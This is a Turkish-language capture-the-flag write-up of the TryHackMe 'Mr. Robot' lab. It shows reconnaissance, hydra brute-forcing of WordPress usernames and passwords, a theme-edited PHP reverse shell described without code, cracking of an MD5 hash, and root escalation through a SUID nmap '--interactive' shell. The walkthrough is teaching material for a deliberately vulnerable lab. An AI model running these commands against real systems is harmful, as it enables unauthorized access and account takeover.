---
title: 'TryHackMe | Mr. Robot CTF WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [wordpress, suid]
render_with_liquid: false
media_subpath: /images/tryhackme_mr_robot/
image:
  path: logo.webp
---

## Özet

Web uygulamasında bulduğumuz robots.txt dosyası içerisinden bir parola listesi elde edecek ve bu parola listesini kullanarak wordpress uygulamasının kullanıcı adını ve parolasını öğreneceğiz. Daha sonra siteye giriş yapacak ve temalar vasıtasıyla sisteme reverse shell kodumuzu yükleyeceğiz. Sisteme girdikten sonra bir md5 hash'i ile karşılaşacak, onu kıracak ve robot kullanıcısına geçeceğiz. SUID izinlerine sahip dosyaları kontrol ettiğimizde ise nmap dosyasını fark edecek ve onu kullanarak yetki yükselteceğiz.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.223.141
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 03:45 EDT
Nmap scan report for 10.10.223.141
Host is up (0.070s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
```

Tarama sonucunda 22, 80 ve 443 numaralı portların açık olduğunu öğreniyoruz. Daha fazla bilgi edinmek adına web uygulamasını ziyaret edelim.

### 80 numaralı port'un incelenmesi

![](1.webp){: width="1200" height="600" }

Ana sayfada bir komut satırının açıldığını görüyoruz. Buradaki hiçbir komut önemli bir bilgi barındırmıyor. Dirsearch aracını kullanarak bir dosya/dizin taraması yapalım.

```console
$ dirsearch -u http://10.10.223.141/
...
[03:51:51] 200 -  614B  - /admin/               
[03:52:26] 403 -  214B  - /blog/                
[03:52:53] 200 -    0B  - /favicon.ico          
[03:53:05] 200 -  614B  - /index.html           
[03:53:15] 200 -  504KB - /intro                
[03:53:21] 403 -  212B  - /js/                  
[03:53:35] 200 -  158B  - /license              
[03:53:35] 200 -  158B  - /license.txt
[03:56:05] 200 -   64B  - /readme               
[03:56:05] 200 -   64B  - /readme.html          
[03:56:19] 200 -   41B  - /robots.txt           
[03:56:56] 200 -    0B  - /sitemap              
[03:58:56] 200 -    0B  - /wp-config.php        
[03:58:58] 200 -    0B  - /wp-content/          
...
```

Bulunan dosya ve dizinleri teker teker kontrol ettim. Önemli olan tek bilgi robots.txt dosyasının içerisinde.

```
fsocity.dic
key-1-of-3.txt
```

key-1-of-3.txt dosyasında bulmamız gereken üç bayraktan biri bulunuyor. fsocity.dic dosyasında ise bir parola listesi bulunuyor. Bu parola listesini kullanmadan önce kullanıcıları öğrenmek için wpscan aracını kullandım. Ancak bir kullanıcı bile bulamadı. Rastgele kullanıcı bilgileri girerek, formu test ettiğimizde "kullanıcı geçersiz" şeklinde bir uyarı ile karşılaşıyoruz.

![](2.webp){: width="1200" height="600" }

Hydra aracını kullanarak bu zafiyeti sömürecek ve kullanıcı isimlerini öğreneceğiz.

## Sömürü aşaması

```console
$ hydra -L fsocity.dic -p appdone 10.10.223.141 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
...
[DATA] attacking http-post-form://10.10.223.141:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username
[80][http-post-form] host: 10.10.223.141   login: elliot   password: appdone
...
```

elliot adında bir kullanıcı var olduğunu öğrendik. Bu kullanıcının parolasını bulmak için parametreleri değiştirip tekrar deneme-yanılma saldırısını başlatalım.

```console
$ $hydra -l elliot -P fsocity.dic 10.10.223.141 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username"
...
[DATA] attacking http-post-form://10.10.223.141:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username
[80][http-post-form] host: 10.10.223.141   login: elliot   password: ER28-0652
...
```

Daha sonra php reverse shell yüklemek için siteye giriş yapıyoruz. Temalar sayfasından kullanılan temanın 404 sayfasına php shell'imizi ekleyelim.

![](3.webp){: width="1200" height="600" }

Ekledikten sonra olmayan bir sayfayı açmaya çalıştığımızda sistemden bir shell elde ediyoruz.

![](4.webp){: width="1200" height="600" }

## Yetki yükseltme

### robot

/home/robot dizininde ikinci bayrak ve kullanıcı parolasının md5 karşılığı bulunuyor.

```console
daemon@linux:/home$ cd robot/
daemon@linux:/home/robot$ ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt 
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca6*****
daemon@linux:/home/robot$
```

Bu hash'i [hashes.com](https://hashes.com/) yardımıyla kırdıktan sonra kullanıcıya geçiş yapıyor ve bayrağı alıyoruz.

```console
daemon@linux:/home/robot$ su robot
Password: 
robot@linux:~$ cat key-2-of-3.txt 
822***959
robot@linux:~$
```

### root

SUID yetkilerine sahip dosyaları listelediğimizde nmap aracınında bu listede olduğunu görüyoruz.

```console
robot@linux:~$ find / -perm -4000 2>/dev/null
...
/usr/local/bin/nmap
...
```

Aracın adını [gtfobins](https://gtfobins.github.io/gtfobins/nmap/#shell) sitesinde arattığımızda nasıl yetki yükseltebileceğimizi öğreniyor ve öğrendiğimizi uyguluyoruz.

```console
robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
# ls
firstboot_done  key-3-of-3.txt
```
